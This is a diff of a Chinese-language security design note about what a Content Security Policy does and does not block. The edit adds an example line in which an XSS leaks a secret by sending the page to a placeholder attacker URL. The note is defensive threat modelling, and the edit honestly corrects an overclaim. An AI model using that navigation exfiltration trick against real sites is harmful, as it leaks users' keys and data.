@@ -12,8 +12,13 @@
   它保的是**万一前四层被绕过之后，攻击者能拿这些东西干什么**：
     - default-src 'none'  → 不许加载任何外部脚本/样式/图片/字体，
                             于是没法把远端 payload 拉进来执行
-    - connect-src 只到本地 bridge → **没有外发信道**：
-                            密钥、已装列表、扫描结果都回不去攻击者的服务器
+    - connect-src 只到本地 bridge → 堵住 fetch / XHR / WebSocket / img 等
+                            **取数信道**：密钥、已装列表、扫描结果都回不去
+                            攻击者的服务器
+                            ⚠️ 但它**不拦页面导航** —— navigate-to 这条指令
+                            至今没有落地。一次 XSS 仍可
+                            location.href='https://attacker/?'+密钥 把东西带出去。
+                            所以这里是"大幅收窄"，**不是"没有外发信道"**
     - base-uri / form-action 'none' → 堵掉"改 base 把相对 URL 指到别处"
                             和"把数据塞进表单提交出去"这两条绕路
 
